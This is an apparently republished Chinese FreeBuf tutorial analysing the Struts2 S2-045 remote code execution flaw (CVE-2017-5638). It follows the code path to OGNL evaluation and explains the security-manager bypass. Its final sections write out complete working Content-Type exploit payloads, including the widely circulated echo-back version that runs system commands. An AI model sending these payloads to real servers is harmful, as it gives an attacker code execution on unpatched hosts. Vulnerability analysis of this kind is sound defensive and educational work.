@@ -1,0 +1,188 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+ ** ***本文原创作者：TopScrew，本文属FreeBuf原创奖励计划，未经许可禁止转载**  
+**
+
+##  **0x01 前言**
+
+**Struts2漏洞频发的Java主流框架，在利用大佬们的poc或者工具时，我们又是否知道这个漏洞到底谁怎么产生的，那么一大串的POC到底是什么意思？准备从漏洞的调用链，到Bypass安全管理器到POC的拆分理解。**
+
+##  **0x02漏洞概述：**
+
+(说点废话)Struts是Apache基金会的一个开源项目,Struts框架广泛应用于政府、公安、交通、金融行业和运营商的网站建设，是应用最广泛的Web应用框架之一。
+
+>  **漏洞编号** ：CVE-2017-5638
+>
+>  **漏洞全称** ：基于Jakarta插件的插件的Struts远程代码执行漏洞
+>
+>  **描述** ：Struts使用的Jakarta解析文件上传请求包不当，当攻击者使用恶意的Content-Type，会导致远程命令执行。
+>
+>  **利用条件** ：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10
+
+默认模块Jakarta中需要依赖commons-fileupload和commons-io
+
+##  **0x03分析概述：**
+
+首先先从简单的漏洞描述开始分析：描述中说道是因为Jakarta插件文件请求包不当导致的远程命令执行，那是不是这个漏洞非常的 **鸡肋**
+，需要依赖于第三方jar包，才可以攻击成功。
+
+其实不是的,因为struts2-croe-2.3.20.jar中struts-default.xml中指定默认的处理multipart报文的解析器是jakarta
+
+![image.png](https://image.3001.net/images/20180315/15211119836580.png!small)  
+
+所以一般只要是Struts2涉及到文件上传，就定会有jakarta插件，而jakarta插件又依赖于依赖commons-fileupload和commons-io两个第三方jar包。
+
+为什么说是一般呢，程序员可以将默认的上传插件在Str2的配置文件改掉。但是我想使用Str2框架写项目的这样做的程序员并不多。所以只要符合Str2影响版本，可以不考虑第三方jar和插件的原因，
+直接远程命令执行。相信不需要什么太多的环境依赖和限制条件，直接可以RCE。在当时影响多大就不在絮叨了。
+
+##  **0x04动态调用分析：**
+
+首先Str2框架写的所有的请求会被StrutsPrepareAndExecuteFilter的过滤器给拦截做处理
+
+![image.png](https://image.3001.net/images/20180315/15211119992727.png!small)  
+
+跟进StrutsPrepareAndExecuteFilter，wrapRequest对request进行了封装  
+
+继续跟进，发现会对ContentType进行判断，看是否包含multipart/form-data字段，包含就继续，不包含就G,这就是说为什么网上流传的那些poc为什么都需要构造multipart/form-data字段。跟进getMultiPartRequest  
+
+![image.png](https://image.3001.net/images/20180315/15211120383376.png!small)  
+
+发现通过MultPartReques.class的类类型，来获取MultPartReques实例  
+
+![image.png](https://image.3001.net/images/20180315/15211120564070.png!small)  
+
+而MultiPartRequest又由JakartaMultiPartRequest类来实现，也就是咱们刚开始唠的这个依赖Jakarta插件的漏洞到底鸡肋不鸡肋。再一次得到了验证。  
+
+![image.png](https://image.3001.net/images/20180315/15211120748169.png!small)  
+
+接着交给依赖包fileipload进行解析，首先会判断contentType是否为空，如果不为空再判断是否是MULTIPART开头如果不是就报InvalidContentTypeException的异常。这就证明了为啥流传的poc的multipart/form-data字段前面或多或少的老有一些没有任何联系的任意字符。  
+
+![image.png](https://image.3001.net/images/20180315/15211120873992.png!small)  
+
+![image.png](https://image.3001.net/images/20180315/15211120965730.png!small)  
+
+放发生异常后，又会返回到JakartaMultiPartRequest类的parse方法对异常进行处理。看一看有两异常，第一个文件过大异常，和除文件过大外的其它异常。当发生异常后他们都会进入一个神奇的方法buildErrorMessage。  
+
+![image.png](https://image.3001.net/images/20180315/15211121207321.png!small)  
+
+而buildErrorMessage方法里又存在一个LocalizedTextUtil.findText这个就是我们今天的主角。为什么这么说呢  
+
+![image.png](https://image.3001.net/images/20180315/15211121355377.png!small)  
+
+为了说为什么是主角，拿出了struts2-2.3.32也就是官方修复后不存在漏洞的版本。也就是下图。  
+
+![image.png](https://image.3001.net/images/20180315/15211121503299.png!small)  
+
+发现官方的修复方案就是对LocalizedTextUtil.findText进行了处理。我们看看到底有什么猫腻  
+
+![image.png](https://image.3001.net/images/20180315/15211121633993.png!small)  
+
+被处理的FindText方法中，有一个重要的参数也就是e.getMessage,里边存了异常信息和咱们恶意的构造的ContentType。最后会把ContentType中的ongl语句去解析执行。所以官方不再把e.getMessage作为而LocalizedTextUtil.findText的defatulMessage参数而是作为args参数传入。
+
+再次跟进FindText方法，getDefaultMessage  
+
+![image.png](https://image.3001.net/images/20180315/15211121845617.png!small)  
+
+getDefaultMessage方法，而getDefaultMessage方法又调用了buildMessageFormat方法  
+
+![image.png](https://image.3001.net/images/20180315/15211122046761.png!small)  
+
+跟进buildMessageFormat方法参数中的TextParseUtil.translateVariables,expression中携带了恶意的ContentType参数。  
+
+![image.png](https://image.3001.net/images/20180315/1521112217270.png!small)  
+
+再次跟进最终由TextParseUtil类的evaluate方法对ongl语句进行了解析。  
+
+![image.png](https://image.3001.net/images/20180315/15211122382915.png!small)  
+
+## **0x05Bypass** **安全管理器**
+
+既然知道了漏洞触发点构造ongl语句是不是就可以直接远程命令执行了？当然还是不能，因为Struts2自己的安全管理器，对非法字符进行了黑名单校验。像我们要想执行命令的Runtime
+，System，Classloder的危险类全部禁止掉了，那我们怎么去执行系统命令。
+
+![image.png](https://image.3001.net/images/20180315/15211122528097.png!small)  
+
+  
+
+_memberAccess是OgnlContext中的一个属性，这是一个权限类SecurityMemberAccess继承了DefaultMemberAccess。其中的isClassExcluded就是循环的判断是否。  
+
+![image.png](https://image.3001.net/images/20180315/15211122743809.png!small)  
+
+而poc中的%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS就是利用父类DefaultMemberAccess对象覆盖SecurityMemberAccess对象，从而达到绕过SecurityMemberAccess的限制。既然分析的差不多了那就看看怎么构造poc去攻击吧。
+
+##  **0x06POC分析：**
+
+最简单的poc，其实下面这一段完全就可以进行命令执行了。而流传的那些复杂的一大串poc就是为了回显，辨别操作系统类型，减少Bug.....去更加的人性化。
+
+    
+    
+    Content-Type: -multipart/form-data %{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('calc')}
+
+###  **成熟poc**
+
+这就是网上一直流传的有回显的poc,看见这么一长串的poc是不是瞬间很蒙蔽，还是ongl语句。  
+
+    
+    
+    Content-Type:"%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"pwd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=newjava.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+
+###  **POC拆分：**
+
+客观莫荒咱们把他拆分来看，即使不懂ongl语句，也可以把他当成java来看。
+
+用来构造上传验证，即使是GET请求也可以进行攻击。
+
+    
+    
+    %{(#xxx='multipart/form-data').
+
+清空访问限制
+
+    
+    
+    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):
+
+清空访问限制，重启后才恢复
+
+    
+    
+    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+    
+    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+    
+    (#ognlUtil.getExcludedPackageNames().clear()).
+    
+    (#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).
+
+判断操操作系统的类型，执行相应的系统命令
+
+    
+    
+    (#cmd='"pwd"').
+    
+    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
+    
+    (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
+    
+    (#p=new java.lang.ProcessBuilder(#cmds)).
+    
+    (#p.redirectErrorStream(true)).
+    
+    (#process=#p.start()).
+
+回显，也就是想办法获得容器的response来将命令结果复制到返回值，完成回显
+
+    
+    
+    (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
+    
+    (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
+    
+    (#ros.flush())}"
+
+##  **0x07 总结：**
+
+其实本篇文章就是给一些喜欢Java,但是又不懂漏洞的产生原因和poc到底怎么来的同学们分享一下自己对Str2-045的理解。当然有可能又的地方分析的不太准确或者错误，毕竟刚接触Java不久也不是做开发的，全凭兴趣和好奇心。另外给大家分享两个Java反编译小工具jd-gui和luyten。学习Java代码审计没有趁手的工具怎么行。jd-gui用起来结构非常清爽，但是有着致命的缺点就是反编译的不准确。而luyten结构一壶篇，但反编译的异常的精确。小伙伴们还在等什么开始Str2各个版本的漏洞调试吧！
+
+ ***本文原创作者：TopScrew，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
